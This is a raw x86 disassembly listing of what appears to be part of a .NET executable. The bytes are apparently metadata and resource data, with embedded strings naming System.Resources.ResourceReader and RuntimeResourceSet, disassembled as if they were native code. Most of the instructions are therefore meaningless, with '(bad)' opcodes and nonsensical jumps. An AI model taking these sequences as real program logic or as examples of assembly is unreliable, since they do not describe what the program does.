  4037ea:	add    BYTE PTR [edx+0x0],cl
  4037ed:	add    BYTE PTR [eax],al
  4037ef:	pop    esi
  4037f0:	add    BYTE PTR [eax],al
  4037f2:	add    BYTE PTR [eax],bh
  4037f4:	int    0x0
  4037f6:	add    BYTE PTR [eax],al
  4037f8:	push   cs
  4037f9:	add    al,0x6f
  4037fb:	sbb    DWORD PTR [eax],eax
  4037fd:	add    BYTE PTR [esi],al
  4037ff:	add    ebp,DWORD PTR [edi-0x6b]
  403802:	add    BYTE PTR [eax],al
  403804:	or     al,BYTE PTR ds:0xa175416
  40380a:	cmp    BYTE PTR [esi+0xe000000],dh
  403810:	add    al,0x6f
  403812:	sbb    al,BYTE PTR [eax]
  403814:	add    BYTE PTR [esi],al
  403816:	add    ebp,DWORD PTR [edi-0x6b]
  403819:	add    BYTE PTR [eax],al
  40381b:	or     al,BYTE PTR ds:0xa175416
  403821:	cmp    BYTE PTR [edi+0xe000000],bl
  403827:	add    al,0x6f
  403829:	pop    ss
  40382a:	add    BYTE PTR [eax],al
  40382c:	push   es
  40382d:	add    ebp,DWORD PTR [edi-0x6b]
  403830:	add    BYTE PTR [eax],al
  403832:	or     al,BYTE PTR ds:0xa175416
  403838:	cmp    BYTE PTR [eax+0xe000000],cl
  40383e:	add    al,0x6f
  403840:	sbb    BYTE PTR [eax],al
  403842:	add    BYTE PTR [esi],al
  403844:	add    ebp,DWORD PTR [edi-0x6b]
  403847:	add    BYTE PTR [eax],al
  403849:	or     al,BYTE PTR ds:0xa175416
  40384f:	sub    esi,DWORD PTR [esi+ecx*1+0x4]
  403853:	outs   dx,DWORD PTR ds:[esi]
  403854:	sbb    al,0x0
  403856:	add    BYTE PTR [esi],al
  403858:	add    ebp,DWORD PTR [eax]
  40385a:	outs   dx,DWORD PTR ds:[esi]
  40385b:	add    BYTE PTR [eax],al
  40385d:	or     ch,BYTE PTR [eax]
  40385f:	lea    eax,[eax]
  403861:	add    BYTE PTR [edx],cl
  403863:	outs   dx,DWORD PTR ds:[esi]
  403864:	mov    ds:0x50a0000,al
  403869:	push   ss
  40386a:	push   esp
  40386b:	pop    ss
  40386c:	or     ch,BYTE PTR [ebx]
  40386e:	push   esi
  40386f:	add    al,0xc
  403871:	or     BYTE PTR [ecx+ebx*2],bl
  403874:	inc    ebp
  403875:	push   es
  403876:	add    BYTE PTR [eax],al
  403878:	add    BYTE PTR [ecx],cl
  40387a:	add    BYTE PTR [eax],al
  40387c:	add    BYTE PTR [edx],bl
  40387e:	add    BYTE PTR [eax],al
  403880:	add    BYTE PTR [ecx],ah
  403882:	add    BYTE PTR [eax],al
  403884:	add    BYTE PTR [eax],ch
  403886:	add    BYTE PTR [eax],al
  403888:	add    BYTE PTR [edi],ch
  40388a:	add    BYTE PTR [eax],al
  40388c:	add    BYTE PTR [edx],al
  40388e:	add    BYTE PTR [eax],al
  403890:	add    BYTE PTR [ebx],ch
  403892:	xor    al,BYTE PTR ds:0xa17541b
  403898:	sub    ebp,DWORD PTR [ebx]
  40389a:	push   cs
  40389b:	add    al,0x6f
  40389d:	sbb    eax,DWORD PTR [eax]
  40389f:	add    BYTE PTR [esi],al
  4038a1:	pop    ss
  4038a2:	outs   dx,DWORD PTR ds:[esi]
  4038a3:	call   0x2b0a:0x170a0000
  4038aa:	sbb    al,BYTE PTR ds:0xa175417
  4038b0:	sub    edx,DWORD PTR [ebx]
  4038b2:	add    eax,0xa175418
  4038b7:	sub    ecx,DWORD PTR [eax*1+0xa175419]
  4038be:	sub    eax,DWORD PTR ds:0x17541a05
  4038c4:	or     al,BYTE PTR [esi]
  4038c6:	sub    al,0x11
  4038c8:	push   cs
  4038c9:	add    al,0x6f
  4038cb:	adc    eax,0x2d060000
  4038d0:	or     BYTE PTR [esi],cl
  4038d2:	add    al,0x17
  4038d4:	outs   dx,DWORD PTR ds:[esi]
  4038d5:	push   ss
  4038d6:	add    BYTE PTR [eax],al
  4038d8:	push   es
  4038d9:	push   es
  4038da:	sub    al,BYTE PTR [eax]
  4038dc:	adc    esi,DWORD PTR [eax]
  4038de:	add    al,0x0
  4038e0:	std    
  4038e1:	add    al,BYTE PTR [eax]
  4038e3:	add    BYTE PTR [ebx],dl
  4038e5:	add    BYTE PTR [eax],al
  4038e7:	adc    DWORD PTR [edi],ebx
  4038e9:	push   cs
  4038ea:	lea    edx,[edx]
  4038ec:	add    BYTE PTR [eax],al
  4038ee:	add    cl,BYTE PTR [edx]
  4038f0:	push   es
  4038f1:	push   ss
  4038f2:	(bad)  
  4038f3:	adc    al,BYTE PTR [eax]
  4038f5:	add    BYTE PTR [edx],al
  4038f7:	jb     0x4038f7
  4038f9:	or     al,BYTE PTR [eax]
  4038fb:	jo     0x403914
  4038fd:	jae    0x403943
  4038ff:	add    BYTE PTR [eax],al
  403901:	push   es
  403902:	adc    DWORD PTR [edx],0x6020000
  403908:	pop    ss
  403909:	(bad)  
  40390a:	adc    al,BYTE PTR [eax]
  40390c:	add    BYTE PTR [edx],al
  40390e:	jb     0x403916
  403910:	or     eax,DWORD PTR [eax]
  403912:	jo     0x40392c
  403914:	jae    0x40395a
  403916:	add    BYTE PTR [eax],al
  403918:	push   es
  403919:	adc    DWORD PTR [edx],0x6020000
  40391f:	sbb    BYTE PTR [edi+0x2000012],cl
  403925:	jb     0x403939
  403927:	or     eax,DWORD PTR [eax]
  403929:	jo     0x403947
  40392b:	jae    0x403971
  40392d:	add    BYTE PTR [eax],al
  40392f:	push   es
  403930:	adc    DWORD PTR [edx],0x6020000
  403936:	sbb    DWORD PTR [edi+0x2000012],ecx
  40393c:	jb     0x403954
  40393e:	or     eax,DWORD PTR [eax]
  403940:	jo     0x40395f
  403942:	jae    0x403988
  403944:	add    BYTE PTR [eax],al
  403946:	push   es
  403947:	adc    DWORD PTR [edx],0x6020000
  40394d:	sbb    cl,BYTE PTR [edi+0x2000012]
  403953:	jb     0x40396f
  403955:	or     eax,DWORD PTR [eax]
  403957:	jo     0x403977
  403959:	jae    0x40399f
  40395b:	add    BYTE PTR [eax],al
  40395d:	push   es
  40395e:	adc    DWORD PTR [edx],0x6020000
  403964:	sbb    ecx,DWORD PTR [edi+0x2000012]
  40396a:	jb     0x40398a
  40396c:	or     eax,DWORD PTR [eax]
  40396e:	jo     0x40398f
  403970:	or     DWORD PTR [ebx+0x44],esi
  403973:	add    BYTE PTR [eax],al
  403975:	push   es
  403976:	adc    DWORD PTR [edx],0x6020000
  40397c:	sbb    al,0x8f
  40397e:	adc    al,BYTE PTR [eax]
  403980:	add    BYTE PTR [edx],al
  403982:	jb     0x4039a6
  403984:	or     eax,DWORD PTR [eax]
  403986:	jo     0x4039a7
  403988:	or     dh,BYTE PTR [ebx+0x44]
  40398b:	add    BYTE PTR [eax],al
  40398d:	push   es
  40398e:	adc    DWORD PTR [edx],0x6020000
  403994:	sbb    eax,0x128f
  403999:	add    dh,BYTE PTR [edx+0x26]
  40399c:	or     eax,DWORD PTR [eax]
  40399e:	jo     0x4039bf
  4039a0:	or     esi,DWORD PTR [ebx+0x44]
  4039a3:	add    BYTE PTR [eax],al
  4039a5:	push   es
  4039a6:	adc    DWORD PTR [edx],0x6020000
  4039ac:	push   ds
  4039ad:	(bad)  
  4039ae:	adc    al,BYTE PTR [eax]
  4039b0:	add    BYTE PTR [edx],al
  4039b2:	jb     0x4039de
  4039b4:	or     eax,DWORD PTR [eax]
  4039b6:	jo     0x4039d7
  4039b8:	pop    ss
  4039b9:	jae    0x4039ff
  4039bb:	add    BYTE PTR [eax],al
  4039bd:	push   es
  4039be:	adc    DWORD PTR [edx],0x6020000
  4039c4:	pop    ds
  4039c5:	or     DWORD PTR [edi+0x2000012],ecx
  4039cb:	jb     0x4039fb
  4039cd:	or     eax,DWORD PTR [eax]
  4039cf:	jo     0x4039f0
  4039d1:	sbb    DWORD PTR [ebx+0x44],esi
  4039d4:	add    BYTE PTR [eax],al
  4039d6:	push   es
  4039d7:	adc    DWORD PTR [edx],0x6020000
  4039dd:	pop    ds
  4039de:	or     cl,BYTE PTR [edi+0x2000012]
  4039e4:	jb     0x403a1c
  4039e6:	or     eax,DWORD PTR [eax]
  4039e8:	jo     0x403a09
  4039ea:	sbb    dh,BYTE PTR [ebx+0x44]
  4039ed:	add    BYTE PTR [eax],al
  4039ef:	push   es
  4039f0:	adc    DWORD PTR [edx],0x6020000
  4039f6:	pop    ds
  4039f7:	or     ecx,DWORD PTR [edi+0x2000012]
  4039fd:	jb     0x403a3b
  4039ff:	or     eax,DWORD PTR [eax]
  403a01:	jo     0x403a22
  403a03:	sbb    eax,0x4473
  403a08:	push   es
  403a09:	adc    DWORD PTR [edx],0x6020000
  403a0f:	pop    ds
  403a10:	or     al,0x8f
  403a12:	adc    al,BYTE PTR [eax]
  403a14:	add    BYTE PTR [edx],al
  403a16:	jb     0x403a62
  403a18:	or     eax,DWORD PTR [eax]
  403a1a:	jo     0x403a3b
  403a1c:	sbb    al,0x73
  403a1e:	inc    esp
  403a1f:	add    BYTE PTR [eax],al
  403a21:	push   es
  403a22:	adc    DWORD PTR [edx],0x6020000
  403a28:	pop    ds
  403a29:	or     eax,0x128f
  403a2e:	add    dh,BYTE PTR [edx+0x5a]
  403a31:	or     eax,DWORD PTR [eax]
  403a33:	jo     0x403a54
  403a35:	push   ds
  403a36:	jae    0x403a7c
  403a38:	add    BYTE PTR [eax],al
  403a3a:	push   es
  403a3b:	adc    DWORD PTR [edx],0x6020000
  403a41:	adc    BYTE PTR [edx+0x0],0x0
  403a45:	add    al,0x1f
  403a47:	jge    0x2403a5f
  403a4d:	or     eax,DWORD PTR [edi]
  403a4f:	push   ss
  403a50:	(bad)  
  403a51:	adc    al,BYTE PTR [eax]
  403a53:	add    BYTE PTR [edx],al
  403a55:	jb     0x403ac7
  403a57:	or     eax,DWORD PTR [eax]
  403a59:	jo     0x403a74
  403a5b:	jae    0x403aa1
  403a5d:	add    BYTE PTR [eax],al
  403a5f:	push   es
  403a60:	adc    DWORD PTR [edx],0x7020000
  403a66:	pop    ss
  403a67:	(bad)  
  403a68:	adc    al,BYTE PTR [eax]
  403a6a:	add    BYTE PTR [edx],al
  403a6c:	jb     0x403aea
  403a6e:	or     eax,DWORD PTR [eax]
  403a70:	jo     0x403a8c
  403a72:	jae    0x403ab8
  403a74:	add    BYTE PTR [eax],al
  403a76:	push   es
  403a77:	adc    DWORD PTR [edx],0x7020000
  403a7d:	sbb    BYTE PTR [edi+0x2000012],cl
  403a83:	jb     0x403a11
  403a85:	or     eax,DWORD PTR [eax]
  403a87:	jo     0x403aa4
  403a89:	jae    0x403acf
  403a8b:	add    BYTE PTR [eax],al
  403a8d:	push   es
  403a8e:	adc    DWORD PTR [edx],0x7020000
  403a94:	sbb    DWORD PTR [edi+0x2000012],ecx
  403a9a:	jb     0x403a32
  403a9c:	or     eax,DWORD PTR [eax]
  403a9e:	jo     0x403abf
  403aa0:	or     al,0x73
  403aa2:	inc    esp
  403aa3:	add    BYTE PTR [eax],al
  403aa5:	push   es
  403aa6:	adc    DWORD PTR [edx],0x7020000
  403aac:	sbb    cl,BYTE PTR [edi+0x2000012]
  403ab2:	jb     0x403a66
  403ab4:	or     eax,DWORD PTR [eax]
  403ab6:	jo     0x403ad7
  403ab8:	or     eax,0x4473
  403abd:	push   es
  403abe:	adc    DWORD PTR [edx],0x7020000
  403ac4:	sbb    ecx,DWORD PTR [edi+0x2000012]
  403aca:	jb     0x403a88
  403acc:	or     eax,DWORD PTR [eax]
  403ace:	jo     0x403aef
  403ad0:	push   cs
  403ad1:	jae    0x403b17
  403ad3:	add    BYTE PTR [eax],al
  403ad5:	push   es
  403ad6:	adc    DWORD PTR [edx],0x7020000
  403adc:	sbb    al,0x8f
  403ade:	adc    al,BYTE PTR [eax]
  403ae0:	add    BYTE PTR [edx],al
  403ae2:	jb     0x403aa6
  403ae4:	or     eax,DWORD PTR [eax]
  403ae6:	jo     0x403b07
  403ae8:	(bad)  
  403aea:	inc    esp
  403aeb:	add    BYTE PTR [eax],al
  403aed:	push   es
  403aee:	adc    DWORD PTR [edx],0x7020000
  403af4:	sbb    eax,0x128f
  403af9:	add    dh,BYTE PTR [edx-0x2e]
  403afc:	or     eax,DWORD PTR [eax]
  403afe:	jo     0x403b1f
  403b00:	adc    BYTE PTR [ebx+0x44],dh
  403b03:	add    BYTE PTR [eax],al
  403b05:	push   es
  403b06:	adc    DWORD PTR [edx],0x7020000
  403b0c:	push   ds
  403b0d:	(bad)  
  403b0e:	adc    al,BYTE PTR [eax]
  403b10:	add    BYTE PTR [edx],al
  403b12:	jb     0x403af8
  403b14:	or     eax,DWORD PTR [eax]
  403b16:	jo     0x403b37
  403b18:	adc    DWORD PTR [ebx+0x44],esi
  403b1b:	add    BYTE PTR [eax],al
  403b1d:	push   es
  403b1e:	adc    DWORD PTR [edx],0x7020000
  403b24:	pop    ds
  403b25:	or     DWORD PTR [edi+0x2000012],ecx
  403b2b:	jb     0x403b1f
  403b2d:	or     eax,DWORD PTR [eax]
  403b2f:	jo     0x403b50
  403b31:	adc    dh,BYTE PTR [ebx+0x44]
  403b34:	add    BYTE PTR [eax],al
  403b36:	push   es
  403b37:	adc    DWORD PTR [edx],0x7020000
  403b3d:	pop    ds
  403b3e:	or     cl,BYTE PTR [edi+0x2000012]
  403b44:	jb     0x403b4e
  403b46:	or     al,0x0
  403b48:	jo     0x403b69
  403b4a:	adc    esi,DWORD PTR [ebx+0x44]
  403b4d:	add    BYTE PTR [eax],al
  403b4f:	push   es
  403b50:	adc    DWORD PTR [edx],0x7020000
  403b56:	pop    ds
  403b57:	or     ecx,DWORD PTR [edi+0x2000012]
  403b5d:	jb     0x403b6d
  403b5f:	or     al,0x0
  403b61:	jo     0x403b82
  403b63:	adc    al,0x73
  403b65:	inc    esp
  403b66:	add    BYTE PTR [eax],al
  403b68:	push   es
  403b69:	adc    DWORD PTR [edx],0x7020000
  403b6f:	pop    ds
  403b70:	or     al,0x8f
  403b72:	adc    al,BYTE PTR [eax]
  403b74:	add    BYTE PTR [edx],al
  403b76:	jb     0x403b8e
  403b78:	or     al,0x0
  403b7a:	jo     0x403b9b
  403b7c:	adc    eax,0x4473
  403b81:	push   es
  403b82:	adc    DWORD PTR [edx],0x7020000
  403b88:	pop    ds
  403b89:	or     eax,0x128f
  403b8e:	add    dh,BYTE PTR [edx+0x2a]
  403b91:	or     al,0x0
  403b93:	jo     0x403bb4
  403b95:	sbb    BYTE PTR [ebx+0x44],dh
  403b98:	add    BYTE PTR [eax],al
  403b9a:	push   es
  403b9b:	adc    DWORD PTR [edx],0x7020000
  403ba1:	pop    ds
  403ba2:	push   cs
  403ba3:	(bad)  
  403ba4:	adc    al,BYTE PTR [eax]
  403ba6:	add    BYTE PTR [edx],al
  403ba8:	jb     0x403be4
  403baa:	or     al,0x0
  403bac:	jo     0x403bcd
  403bae:	sbb    esi,DWORD PTR [ebx+0x44]
  403bb1:	add    BYTE PTR [eax],al
  403bb3:	push   es
  403bb4:	adc    DWORD PTR [edx],0x7020000
  403bba:	adc    BYTE PTR [ebx+0x0],0x0
  403bbe:	add    al,0x17
  403bc0:	lea    edx,[edx]
  403bc2:	add    BYTE PTR [eax],al
  403bc4:	add    cl,BYTE PTR [eax+ecx*1]
  403bc7:	push   ss
  403bc8:	(bad)  
  403bc9:	adc    al,BYTE PTR [eax]
  403bcb:	add    BYTE PTR [edx],al
  403bcd:	jb     0x403bc9
  403bcf:	or     al,BYTE PTR [eax]
  403bd1:	jo     0x403bf2
  403bd3:	push   ss
  403bd4:	jae    0x403c1a
  403bd6:	add    BYTE PTR [eax],al
  403bd8:	push   es
  403bd9:	adc    DWORD PTR [edx],0x8020000
  403bdf:	adc    BYTE PTR [eax+eax*1+0x0],0x4
  403be4:	sub    cl,dh
  403be6:	add    dh,BYTE PTR [ebx+0x26]
  403be9:	add    BYTE PTR [eax],al
  403beb:	push   es
  403bec:	jge    0x403c43
  403bee:	add    BYTE PTR [eax],al
  403bf0:	add    al,0x2
  403bf2:	jae    0x403c08
  403bf4:	add    BYTE PTR [eax],al
  403bf6:	push   es
  403bf7:	jge    0x403c4f
  403bf9:	add    BYTE PTR [eax],al
  403bfb:	add    al,0x2
  403bfd:	jae    0x403c49
  403bff:	add    BYTE PTR [eax],al
  403c01:	push   es
  403c02:	jge    0x403c5b
  403c04:	add    BYTE PTR [eax],al
  403c06:	add    al,0x2
  403c08:	jae    0x403bad
  403c0a:	add    BYTE PTR [eax],al
  403c0c:	or     bh,BYTE PTR [ebp+0x58]
  403c0f:	add    BYTE PTR [eax],al
  403c11:	add    al,0x2
  403c13:	sub    BYTE PTR [eax+eax*1+0x0],bh
  403c17:	or     ch,BYTE PTR [edx]
  403c19:	push   ds
  403c1a:	add    ch,BYTE PTR [eax]
  403c1c:	jl     0x403c1e
  403c1e:	add    BYTE PTR [edx],cl
  403c20:	sub    bh,BYTE PTR [esi]
  403c22:	add    al,BYTE PTR [ebx]
  403c24:	jge    0x403be9
  403c26:	add    BYTE PTR [eax],al
  403c28:	add    al,0x2
  403c2a:	add    al,0x7d
  403c2c:	les    eax,FWORD PTR [eax]
  403c2e:	add    BYTE PTR [edx+ebp*1],al
  403c31:	push   ds
  403c32:	add    bh,BYTE PTR [ebx-0x37]
  403c35:	add    BYTE PTR [eax],al
  403c37:	add    al,0x2a
  403c39:	push   ds
  403c3a:	add    bh,BYTE PTR [ebx-0x36]
  403c3d:	add    BYTE PTR [eax],al
  403c3f:	add    al,0x2a
  403c41:	push   ds
  403c42:	add    bh,BYTE PTR [ebx-0x35]
  403c45:	add    BYTE PTR [eax],al
  403c47:	add    al,0x2a
  403c49:	push   ds
  403c4a:	add    bh,BYTE PTR [ebx-0x34]
  403c4d:	add    BYTE PTR [eax],al
  403c4f:	add    al,0x2a
  403c51:	push   ds
  403c52:	add    bh,BYTE PTR [ebx-0x33]
  403c55:	add    BYTE PTR [eax],al
  403c57:	add    al,0x2a
  403c59:	cli    
  403c5a:	add    dh,BYTE PTR [ebx+0x7e]
  403c5d:	add    BYTE PTR [eax],al
  403c5f:	or     bh,BYTE PTR [ebp-0x37]
  403c62:	add    BYTE PTR [eax],al
  403c64:	add    al,0x2
  403c66:	jae    0x403ce6
  403c68:	add    BYTE PTR [eax],al
  403c6a:	or     bh,BYTE PTR [ebp-0x36]
  403c6d:	add    BYTE PTR [eax],al
  403c6f:	add    al,0x2
  403c71:	jae    0x403c18
  403c73:	add    BYTE PTR [eax],al
  403c75:	or     bh,BYTE PTR [ebp-0x35]
  403c78:	add    BYTE PTR [eax],al
  403c7a:	add    al,0x2
  403c7c:	jae    0x403c24
  403c7e:	add    BYTE PTR [eax],al
  403c80:	or     bh,BYTE PTR [ebp-0x34]
  403c83:	add    BYTE PTR [eax],al
  403c85:	add    al,0x2
  403c87:	jae    0x403c30
  403c89:	add    BYTE PTR [eax],al
  403c8b:	or     bh,BYTE PTR [ebp-0x33]
  403c8e:	add    BYTE PTR [eax],al
  403c90:	add    al,0x2
  403c92:	sub    BYTE PTR [eax+eax*1+0x0],bh
  403c96:	or     ch,BYTE PTR [edx]
  403c98:	push   ds
  403c99:	add    bh,BYTE PTR [ebx-0x32]
  403c9c:	add    BYTE PTR [eax],al
  403c9e:	add    al,0x2a
  403ca0:	push   ds
  403ca1:	add    bh,BYTE PTR [ebx-0x31]
  403ca4:	add    BYTE PTR [eax],al
  403ca6:	add    al,0x2a
  403ca8:	push   ds
  403ca9:	add    bh,BYTE PTR [ebx-0x30]
  403cac:	add    BYTE PTR [eax],al
  403cae:	add    al,0x2a
  403cb0:	push   ds
  403cb1:	add    bh,BYTE PTR [ebx-0x2f]
  403cb4:	add    BYTE PTR [eax],al
  403cb6:	add    al,0x2a
  403cb8:	into   
  403cb9:	add    dh,BYTE PTR [ebx+0x7d]
  403cbc:	add    BYTE PTR [eax],al
  403cbe:	or     bh,BYTE PTR [ebp-0x32]
  403cc1:	add    BYTE PTR [eax],al
  403cc3:	add    al,0x2
  403cc5:	jae    0x403d44
  403cc7:	add    BYTE PTR [eax],al
  403cc9:	or     bh,BYTE PTR [ebp-0x31]
  403ccc:	add    BYTE PTR [eax],al
  403cce:	add    al,0x2
  403cd0:	jae    0x403cef
  403cd2:	add    BYTE PTR [eax],al
  403cd4:	push   es
  403cd5:	jge    0x403ca7
  403cd7:	add    BYTE PTR [eax],al
  403cd9:	add    al,0x2
  403cdb:	jae    0x403cfa
  403cdd:	add    BYTE PTR [eax],al
  403cdf:	push   es
  403ce0:	jge    0x403cb3
  403ce2:	add    BYTE PTR [eax],al
  403ce4:	add    al,0x2
  403ce6:	sub    BYTE PTR [eax+eax*1+0x0],bh
  403cea:	or     ch,BYTE PTR [edx]
  403cec:	push   ds
  403ced:	add    ch,BYTE PTR [eax]
  403cef:	jl     0x403cf1
  403cf1:	add    BYTE PTR [edx],cl
  403cf3:	sub    dl,BYTE PTR [ebx]
  403cf5:	xor    BYTE PTR [ebx],al
  403cf7:	add    BYTE PTR [ebx],dh
  403cf9:	add    BYTE PTR [eax],al
  403cfb:	add    BYTE PTR [eax+eax*1],dl
  403cfe:	add    BYTE PTR [ecx],dl
  403d00:	jle    0x403cd4
  403d02:	add    BYTE PTR [eax],al
  403d04:	add    al,0x14
  403d06:	sub    BYTE PTR [ebx+0x2c0a0000],ch
  403d0c:	and    BYTE PTR [edx+0x4a],dh
  403d0f:	or     al,0x0
  403d11:	jo     0x403ce3
  403d13:	push   ss
  403d14:	add    BYTE PTR [eax],al
  403d16:	add    ch,BYTE PTR [eax]
  403d18:	and    BYTE PTR [eax],al
  403d1a:	add    BYTE PTR [edx],cl
  403d1c:	outs   dx,DWORD PTR ds:[esi]
  403d1d:	lods   al,BYTE PTR ds:[esi]
  403d1e:	add    BYTE PTR [eax],al
  403d20:	or     dh,BYTE PTR [ebx-0x53]
  403d23:	add    BYTE PTR [eax],al
  403d25:	or     cl,BYTE PTR [edx]
  403d27:	push   es
  403d28:	adc    dl,0x0
  403d2b:	add    BYTE PTR [esi+edi*2],al
  403d2e:	rol    BYTE PTR [eax],cl
  403d30:	add    BYTE PTR [edx+ebp*1],al
  403d33:	sbb    bh,BYTE PTR [esi-0x2d]
  403d36:	add    BYTE PTR [eax],al
  403d38:	add    al,0x2a
  403d3a:	push   ds
  403d3b:	add    al,BYTE PTR [eax+0x40000d3]
  403d41:	sub    dl,BYTE PTR [esi+0x28]
  403d44:	push   ecx
  403d45:	add    BYTE PTR [eax],al
  403d47:	push   es
  403d48:	jb     0x403dc0
  403d4a:	or     al,0x0
  403d4c:	jo     0x403dcc
  403d4e:	rol    DWORD PTR [eax],cl
  403d50:	add    BYTE PTR [edi+ebp*2],al
  403d53:	scas   al,BYTE PTR es:[edi]
  403d54:	add    BYTE PTR [eax],al
  403d56:	or     ch,BYTE PTR [edx]
  403d58:	push   esi
  403d59:	sub    BYTE PTR [ecx+0x0],dl
  403d5c:	add    BYTE PTR [esi],al
  403d5e:	jb     0x403cfa
  403d60:	or     al,0x0
  403d62:	jo     0x403de2
  403d64:	rol    DWORD PTR [eax],cl
  403d66:	add    BYTE PTR [edi+ebp*2],al
  403d69:	scas   al,BYTE PTR es:[edi]
  403d6a:	add    BYTE PTR [eax],al
  403d6c:	or     ch,BYTE PTR [edx]
  403d6e:	push   esi
  403d6f:	sub    BYTE PTR [ecx+0x0],dl
  403d72:	add    BYTE PTR [esi],al
  403d74:	jb     0x403d46
  403d76:	or     al,0x0
  403d78:	jo     0x403df8
  403d7a:	rol    DWORD PTR [eax],cl
  403d7c:	add    BYTE PTR [edi+ebp*2],al
  403d7f:	scas   al,BYTE PTR es:[edi]
  403d80:	add    BYTE PTR [eax],al
  403d82:	or     ch,BYTE PTR [edx]
  403d84:	push   esi
  403d85:	sub    BYTE PTR [ecx+0x0],dl
  403d88:	add    BYTE PTR [esi],al
  403d8a:	jb     0x403d74
  403d8c:	or     al,0x0
  403d8e:	jo     0x403e0e
  403d90:	rol    DWORD PTR [eax],cl
  403d92:	add    BYTE PTR [edi+ebp*2],al
  403d95:	scas   al,BYTE PTR es:[edi]
  403d96:	add    BYTE PTR [eax],al
  403d98:	or     ch,BYTE PTR [edx]
  403d9a:	push   esi
  403d9b:	sub    BYTE PTR [ecx+0x0],dl
  403d9e:	add    BYTE PTR [esi],al
  403da0:	jb     0x403db0
  403da2:	or     eax,0xd37e7000
  403da7:	add    BYTE PTR [eax],al
  403da9:	add    al,0x6f
  403dab:	scas   al,BYTE PTR es:[edi]
  403dac:	add    BYTE PTR [eax],al
  403dae:	or     ch,BYTE PTR [edx]
  403db0:	push   esi
  403db1:	sub    BYTE PTR [ecx+0x0],dl
  403db4:	add    BYTE PTR [esi],al
  403db6:	jb     0x403dea
  403db8:	or     eax,0xd37e7000
  403dbd:	add    BYTE PTR [eax],al
  403dbf:	add    al,0x6f
  403dc1:	scas   al,BYTE PTR es:[edi]
  403dc2:	add    BYTE PTR [eax],al
  403dc4:	or     ch,BYTE PTR [edx]
  403dc6:	push   esi
  403dc7:	sub    BYTE PTR [ecx+0x0],dl
  403dca:	add    BYTE PTR [esi],al
  403dcc:	jb     0x403e2c
  403dce:	or     eax,0xd37e7000
  403dd3:	add    BYTE PTR [eax],al
  403dd5:	add    al,0x6f
  403dd7:	scas   al,BYTE PTR es:[edi]
  403dd8:	add    BYTE PTR [eax],al
  403dda:	or     ch,BYTE PTR [edx]
  403ddc:	push   esi
  403ddd:	sub    BYTE PTR [ecx+0x0],dl
  403de0:	add    BYTE PTR [esi],al
  403de2:	jb     0x403e5e
  403de4:	or     eax,0xd37e7000
  403de9:	add    BYTE PTR [eax],al
  403deb:	add    al,0x6f
  403ded:	scas   al,BYTE PTR es:[edi]
  403dee:	add    BYTE PTR [eax],al
  403df0:	or     ch,BYTE PTR [edx]
  403df2:	push   esi
  403df3:	sub    BYTE PTR [ecx+0x0],dl
  403df6:	add    BYTE PTR [esi],al
  403df8:	jb     0x403d92
  403dfa:	or     eax,0xd37e7000
  403dff:	add    BYTE PTR [eax],al
  403e01:	add    al,0x6f
  403e03:	scas   al,BYTE PTR es:[edi]
  403e04:	add    BYTE PTR [eax],al
  403e06:	or     ch,BYTE PTR [edx]
  403e08:	dec    eax
  403e09:	sbb    eax,0xcace0000
  403e0e:	out    dx,eax
  403e0f:	mov    esi,0x1
  403e14:	xchg   ecx,eax
  403e15:	add    BYTE PTR [eax],al
  403e17:	add    BYTE PTR [ebx+edx*2+0x79],ch
  403e1b:	jae    0x403e91
  403e1d:	gs ins DWORD PTR es:[edi],dx
  403e1f:	cs push edx
  403e21:	gs jae 0x403e93
  403e24:	jne    0x403e98
  403e26:	arpl   WORD PTR [ebp+0x73],sp
  403e29:	cs push edx
  403e2b:	gs jae 0x403e9d
  403e2e:	jne    0x403ea2
  403e30:	arpl   WORD PTR [ebp+0x52],sp
  403e33:	gs popa 
  403e35:	fs gs jb 0x403e65
  403e39:	and    BYTE PTR [ebp+0x73],ch
  403e3c:	arpl   WORD PTR [edi+0x72],bp
  403e3f:	ins    BYTE PTR es:[edi],dx
  403e40:	imul   esp,DWORD PTR [edx+0x2c],0x72655620
  403e47:	jae    0x403eb2
  403e49:	outs   dx,DWORD PTR ds:[esi]
  403e4a:	outs   dx,BYTE PTR ds:[esi]
  403e4b:	cmp    eax,0x2e302e34
  403e50:	xor    BYTE PTR [esi],ch
  403e52:	xor    BYTE PTR [eax+eiz*1],ch
  403e55:	inc    ebx
  403e56:	jne    0x403ec4
  403e58:	je     0x403ecf
  403e5a:	jb     0x403ec1
  403e5c:	cmp    eax,0x7475656e
  403e61:	jb     0x403ec4
  403e63:	ins    BYTE PTR es:[edi],dx
  403e64:	sub    al,0x20
  403e66:	push   eax
  403e67:	jne    0x403ecb
  403e69:	ins    BYTE PTR es:[edi],dx
  403e6a:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  403e71:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  403e75:	bound  esi,QWORD PTR [edi]
  403e77:	aaa    
  403e78:	popa   
  403e79:	xor    eax,0x31363563
  403e7e:	cmp    DWORD PTR [ebx],esi
  403e80:	xor    al,0x65
  403e82:	xor    BYTE PTR [eax],bh
  403e84:	cmp    DWORD PTR [ebx],esp
  403e86:	push   ebx
  403e87:	jns    0x403efc
  403e89:	je     0x403ef0
  403e8b:	ins    DWORD PTR es:[edi],dx
  403e8c:	cs push edx
  403e8e:	gs jae 0x403f00
  403e91:	jne    0x403f05
  403e93:	arpl   WORD PTR [ebp+0x73],sp
  403e96:	cs push edx
  403e98:	jne    0x403f08
  403e9a:	je     0x403f05
  403e9c:	ins    DWORD PTR es:[edi],dx
  403e9d:	gs push edx
  403e9f:	gs jae 0x403f11
  403ea2:	jne    0x403f16
  403ea4:	arpl   WORD PTR [ebp+0x53],sp
  403ea7:	gs je  0x403eac
  403eaa:	add    BYTE PTR [eax],al
  403eac:	add    BYTE PTR [ecx],cl
  403eae:	add    BYTE PTR [eax],al
  403eb0:	add    BYTE PTR [eax],al
  403eb2:	add    BYTE PTR [eax],al
  403eb4:	add    BYTE PTR [eax+0x41],dl
  403eb7:	inc    esp
  403eb8:	push   eax
  403eb9:	inc    ecx
  403eba:	inc    esp
  403ebb:	push   eax
  403ebc:	inc    esp
  403ebd:	mov    ds:0x4ebea7e2,al
  403ec2:	ja     0x403e76
  403ec4:	and    al,0x73
  403ec6:	dec    ebp
  403ec7:	mov    esp,0xc3f1a025
  403ecc:	rol    DWORD PTR [edx-0x261d27a2],0x8b
  403ed3:	pop    es
  403ed4:	jge    0x403f13
  403ed6:	mov    ecx,DWORD PTR [esi]
  403ed8:	jns    0x403f1c
  403eda:	dec    ebp
  403edb:	sbb    ch,dl
  403edd:	cmp    dh,cl
